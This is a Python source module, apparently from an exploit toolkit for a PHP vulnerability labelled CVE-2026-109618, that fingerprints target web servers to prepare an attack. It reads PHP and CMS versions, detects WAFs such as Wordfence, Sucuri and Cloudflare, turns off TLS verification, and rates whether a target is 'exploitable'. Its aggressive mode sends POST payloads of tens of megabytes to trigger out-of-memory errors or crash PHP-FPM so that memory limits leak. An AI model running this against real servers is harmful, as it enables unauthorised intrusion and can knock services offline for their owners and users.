"""
CVE-2026-109618 — Auto-adaptive target fingerprinter.

Multi-method detection without requiring a diagnostic endpoint on target:
  1. HTTP headers (X-Powered-By, Server) → PHP version, SAPI
  2. CMS detection (WP, Laravel, Backpack, Drupal) → endpoint list, typical mem
  3. Error page analysis → PHP version from error output
  4. Server software detection → nginx body limit awareness
  5. WAF detection → Wordfence/Sucuri/Cloudflare awareness
  6. Memory limit estimation → from CMS type + server defaults

Works across ALL vulnerable PHP versions (5.x through 8.5.x).
"""
from __future__ import annotations

import re
import ssl
import socket
import urllib.request
import urllib.error
from dataclasses import dataclass, field

from .versions import (
    CMSType, CMSProfile, CMS_PROFILES, ServerLimits,
    VulnStatus, check_version, is_vulnerable, parse_version,
    PHP_DEFAULTS, NGINX_DEFAULT_BODY_SIZE, VULN_RANGES,
)


@dataclass
class PHPInfo:
    version: str | None = None
    sapi: str | None = None
    memory_limit: int | None = None
    max_input_vars: int | None = None
    post_max_size: int | None = None
    vulnerable: bool | None = None
    source: str = "unknown"

    @property
    def version_tuple(self) -> tuple[int, ...] | None:
        if not self.version:
            return None
        parsed = parse_version(self.version)
        return parsed if parsed else None

    def check_vulnerable(self) -> bool | None:
        if not self.version:
            return None
        result = is_vulnerable(self.version)
        self.vulnerable = result
        return result


@dataclass
class CMSInfo:
    cms_type: CMSType = CMSType.GENERIC_PHP
    cms_version: str | None = None
    endpoints: list[str] = field(default_factory=list)
    waf_detected: str | None = None
    source: str = "unknown"

    @property
    def profile(self) -> CMSProfile:
        return CMS_PROFILES[self.cms_type]


@dataclass
class TargetInfo:
    """Complete target fingerprint — assembled from multiple detection methods."""
    url: str
    php: PHPInfo = field(default_factory=PHPInfo)
    cms: CMSInfo = field(default_factory=CMSInfo)
    server: ServerLimits = field(default_factory=ServerLimits)
    detection_methods: list[str] = field(default_factory=list)
    confidence: float = 0.0

    @property
    def exploitable(self) -> bool:
        if self.php.vulnerable is False:
            return False
        if self.php.vulnerable is True:
            return True
        return self.cms.cms_type != CMSType.GENERIC_PHP

    @property
    def summary(self) -> str:
        lines = [f"Target: {self.url}"]
        if self.php.version:
            vc = check_version(self.php.version)
            lines.append(f"PHP: {vc.display}")
        else:
            lines.append("PHP: version unknown (assumed vulnerable)")
        if self.php.sapi:
            lines.append(f"SAPI: {self.php.sapi}")
        lines.append(f"CMS: {self.cms.cms_type.value}")
        if self.cms.cms_version:
            lines.append(f"CMS version: {self.cms.cms_version}")
        mem = self.server.effective_memory_limit
        lines.append(f"Memory limit: {mem // (1024*1024)}M (effective)")
        body = self.server.effective_body_limit
        lines.append(f"Body limit: {body // (1024*1024)}M (effective)")
        if self.cms.waf_detected:
            lines.append(f"WAF: {self.cms.waf_detected}")
        lines.append(f"Methods: {', '.join(self.detection_methods)}")
        lines.append(f"Confidence: {self.confidence:.0%}")
        return "\n".join(lines)


def parse_memory_value(val: str) -> int | None:
    val = val.strip().upper()
    if val == "-1":
        return -1
    m = re.match(r"^(\d+)\s*([KMG]?)$", val)
    if not m:
        return None
    n = int(m.group(1))
    suffix = m.group(2)
    return n * {"": 1, "K": 1024, "M": 1048576, "G": 1073741824}[suffix]


def _make_opener(verify_ssl: bool = False) -> urllib.request.OpenerDirector:
    if not verify_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handler = urllib.request.HTTPSHandler(context=ctx)
        return urllib.request.build_opener(handler)
    return urllib.request.build_opener()


def _request(url: str, method: str = "GET", data: bytes | None = None,
             headers: dict[str, str] | None = None,
             timeout: int = 10, verify_ssl: bool = False,
             ) -> tuple[int, dict[str, str], bytes]:
    opener = _make_opener(verify_ssl)
    req = urllib.request.Request(url, method=method, data=data)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(64 * 1024)
            hdrs = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, hdrs, body
    except urllib.error.HTTPError as e:
        body = e.read(64 * 1024) if e.fp else b""
        hdrs = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        return e.code, hdrs, body
    except (urllib.error.URLError, OSError, socket.timeout):
        return 0, {}, b""


# -- Detection methods --------------------------------------------------------

def detect_php_from_headers(url: str, timeout: int = 10) -> PHPInfo:
    info = PHPInfo(source="headers")
    status, hdrs, _ = _request(url, "HEAD", timeout=timeout)
    if status == 0:
        return info

    xpb = hdrs.get("x-powered-by", "")
    server = hdrs.get("server", "")

    m = re.search(r"PHP[/ ](\d+\.\d+\.\d+)", xpb)
    if m:
        info.version = m.group(1)
        info.check_vulnerable()

    if "fpm" in xpb.lower() or "fpm" in server.lower():
        info.sapi = "fpm-fcgi"
    elif "apache" in server.lower() and "php" in xpb.lower():
        info.sapi = "apache2handler"

    return info


def detect_cms(url: str, timeout: int = 10) -> CMSInfo:
    info = CMSInfo(source="cms-detect")
    base = url.rstrip("/")

    wp_checks = [
        (f"{base}/wp-login.php", r"wp-login\.php|WordPress"),
        (f"{base}/wp-includes/version.php", r"\$wp_version"),
        (f"{base}/wp-content/", r'href=["\'][^"\']*wp-content|wp-includes'),
    ]
    for check_url, pattern in wp_checks:
        status, hdrs, body = _request(check_url, timeout=timeout)
        text = body.decode("utf-8", errors="replace")
        if "phpinfo" in text.lower():
            continue
        if status in (200, 301, 302, 403) and re.search(pattern, text, re.I):
            info.cms_type = CMSType.WORDPRESS
            ver_m = re.search(r"content=['\"]WordPress (\d+\.\d+\.?\d*)", text)
            if not ver_m:
                ver_m = re.search(r"\$wp_version\s*=\s*['\"](\d+\.\d+\.?\d*)", text)
            if ver_m:
                info.cms_version = ver_m.group(1)
            info.endpoints = CMS_PROFILES[CMSType.WORDPRESS].endpoints
            return info

    laravel_checks = [
        (f"{base}/", r"laravel|Laravel"),
        (f"{base}/login", r"csrf|_token"),
    ]
    for check_url, pattern in laravel_checks:
        status, hdrs, body = _request(check_url, timeout=timeout)
        text = body.decode("utf-8", errors="replace")
        cookies = hdrs.get("set-cookie", "")
        if "laravel_session" in cookies or "XSRF-TOKEN" in cookies:
            bp_status, _, bp_body = _request(f"{base}/admin/login", timeout=timeout)
            bp_text = bp_body.decode("utf-8", errors="replace")
            if bp_status in (200, 302) and re.search(r"backpack|BackpackUser", bp_text, re.I):
                info.cms_type = CMSType.BACKPACK
                info.endpoints = CMS_PROFILES[CMSType.BACKPACK].endpoints
            else:
                info.cms_type = CMSType.LARAVEL
                info.endpoints = CMS_PROFILES[CMSType.LARAVEL].endpoints
            return info

    drupal_status, drupal_hdrs, drupal_body = _request(base, timeout=timeout)
    drupal_text = drupal_body.decode("utf-8", errors="replace")
    if ("x-generator" in drupal_hdrs and "drupal" in drupal_hdrs["x-generator"].lower()) or \
       re.search(r"Drupal\.settings|drupal\.js|sites/default", drupal_text):
        info.cms_type = CMSType.DRUPAL
        info.endpoints = CMS_PROFILES[CMSType.DRUPAL].endpoints
        return info

    info.cms_type = CMSType.GENERIC_PHP
    info.endpoints = CMS_PROFILES[CMSType.GENERIC_PHP].endpoints
    return info


def detect_php_from_errors(url: str, timeout: int = 10) -> PHPInfo:
    info = PHPInfo(source="error-page")
    bad_url = url.rstrip("/") + "/wp-cron-" + format(hash(url) & 0xFFFF, '04x') + ".php"
    status, hdrs, body = _request(bad_url, timeout=timeout)
    text = body.decode("utf-8", errors="replace")

    m = re.search(r"PHP[/ ](\d+\.\d+\.\d+)", text)
    if m:
        info.version = m.group(1)
        info.check_vulnerable()
        return info

    m = re.search(r"PHP[/ ](\d+\.\d+\.\d+)", hdrs.get("x-powered-by", ""))
    if m:
        info.version = m.group(1)
        info.check_vulnerable()

    return info


def detect_server_software(url: str, timeout: int = 10) -> ServerLimits:
    limits = ServerLimits()
    status, hdrs, _ = _request(url, "HEAD", timeout=timeout)
    if status == 0:
        return limits

    server = hdrs.get("server", "").lower()
    limits.server_software = hdrs.get("server")

    if "nginx" in server:
        limits.client_max_body_size = NGINX_DEFAULT_BODY_SIZE
    elif "apache" in server:
        limits.client_max_body_size = None
    elif "litespeed" in server:
        limits.client_max_body_size = None
    elif "cloudflare" in server:
        limits.client_max_body_size = 100 * 1024 * 1024

    return limits


def detect_waf(url: str, timeout: int = 10) -> str | None:
    status, hdrs, body = _request(url, timeout=timeout)
    text = body.decode("utf-8", errors="replace")
    all_hdrs = " ".join(f"{k}: {v}" for k, v in hdrs.items()).lower()

    if "wordfence" in text.lower() or "wfwaf" in all_hdrs:
        return "Wordfence"
    if "sucuri" in all_hdrs or "x-sucuri" in hdrs:
        return "Sucuri"
    if "cloudflare" in hdrs.get("server", "").lower():
        if "cf-ray" in hdrs:
            return "Cloudflare"
    if "akamai" in all_hdrs:
        return "Akamai"
    if "x-cdn" in hdrs or "x-cache" in hdrs:
        cdn = hdrs.get("x-cdn", hdrs.get("x-cache", ""))
        if cdn:
            return f"CDN ({cdn[:30]})"

    return None


MEMORY_AMPLIFICATION = 2.0


def detect_memory_from_oom(url: str, endpoint: str, timeout: int = 30,
                           ) -> tuple[int | None, int | None]:
    """Send escalating POST payloads to provoke a PHP OOM error that
    leaks the memory_limit value in the error message.

    Probes at ~6MB, ~24MB, ~64MB — enough to OOM on configs up to ~128M.
    Each step only runs if the previous succeeded (no 413/0) without OOM.

    Returns (memory_limit_bytes, proven_body_limit) — the latter is the
    size of the largest probe body the server accepted (not 413).

    When FPM/nginx crashes (502/503) without PHP error text, estimates
    memory_limit from probe body size × MEMORY_AMPLIFICATION.
    """
    target = url.rstrip("/") + endpoint
    proven_body: int | None = None

    for n_fields in (180, 720, 960):
        pad_val = b"A" * 32767
        parts = []
        for i in range(n_fields):
            parts.append(f"m{i:03d}".encode() + b"=" + pad_val)
        probe_body = b"&".join(parts)

        status, hdrs, body = _request(
            target, "POST", data=probe_body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=timeout,
        )
        text = body.decode("utf-8", errors="replace")

        if status == 413 or status == 0:
            break

        m = re.search(r"Allowed memory size of (\d+) bytes", text)
        if m:
            return int(m.group(1)), len(probe_body)

        if status in (502, 503):
            estimated = int(len(probe_body) * MEMORY_AMPLIFICATION)
            return estimated, proven_body

        proven_body = len(probe_body)

    return None, proven_body


# -- Main fingerprinter -------------------------------------------------------

def fingerprint(url: str, timeout: int = 10, aggressive: bool = False) -> TargetInfo:
    target = TargetInfo(url=url)

    php_hdr = detect_php_from_headers(url, timeout)
    if php_hdr.version:
        target.php = php_hdr
        target.detection_methods.append("headers")
        target.confidence = 0.9

    server = detect_server_software(url, timeout)
    target.server = server
    target.detection_methods.append("server-detect")

    cms = detect_cms(url, timeout)
    target.cms = cms
    target.detection_methods.append("cms-detect")

    if not target.php.version:
        php_err = detect_php_from_errors(url, timeout)
        if php_err.version:
            target.php = php_err
            target.detection_methods.append("error-page")
            target.confidence = 0.7

    waf = detect_waf(url, timeout)
    if waf:
        target.cms.waf_detected = waf
        target.detection_methods.append("waf-detect")

    if not target.php.version:
        target.php.vulnerable = True
        target.php.source = "assumed"
        target.detection_methods.append("assumed-vulnerable")
        target.confidence = 0.3

    profile = CMS_PROFILES[cms.cms_type]
    if profile.typical_memory_limits:
        mid = len(profile.typical_memory_limits) // 2
        target.server.memory_limit = profile.typical_memory_limits[mid]

    if aggressive and cms.endpoints:
        endpoint = cms.endpoints[0]
        oom_mem, proven_body = detect_memory_from_oom(url, endpoint, timeout=30)
        if oom_mem:
            target.server.memory_limit = oom_mem
            target.detection_methods.append("oom-probe")
            target.confidence = min(target.confidence + 0.2, 1.0)
        if proven_body and (
            target.server.client_max_body_size is None
            or proven_body > target.server.client_max_body_size
        ):
            target.server.client_max_body_size = proven_body
            target.server.post_max_size = max(
                target.server.post_max_size or 0, proven_body
            )

    if not target.php.sapi:
        if server.server_software:
            sw = server.server_software.lower()
            if "nginx" in sw:
                target.php.sapi = "fpm-fcgi"
            elif "apache" in sw:
                target.php.sapi = "apache2handler"
            elif "litespeed" in sw:
                target.php.sapi = "litespeed"
        elif target.php.version and not server.server_software:
            target.php.sapi = "cli-server"

    if target.php.vulnerable is None:
        target.php.check_vulnerable()

    return target
